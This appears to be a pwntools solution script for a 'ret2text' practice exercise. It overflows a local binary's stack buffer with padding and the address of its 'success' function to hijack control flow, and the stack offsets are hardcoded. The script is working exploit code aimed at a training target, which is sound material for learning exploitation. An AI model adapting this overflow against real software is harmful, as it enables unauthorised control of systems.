from pwn import *

EBP = 0xffffdba0
ESP = 0xffffdb90

if __name__ == "__main__":
    context.arch = 'amd64'
    context.log_level = 'debug'
    p = process("./ret2text.out")
    file = ELF("./ret2text.out")
    payload = b"A" * (EBP - ESP + 8) + p64(file.symbols["success"])
    p.sendline(payload)
    # # p.sendline(payload)
    print(p.recv())
    # p.interactive()
    
    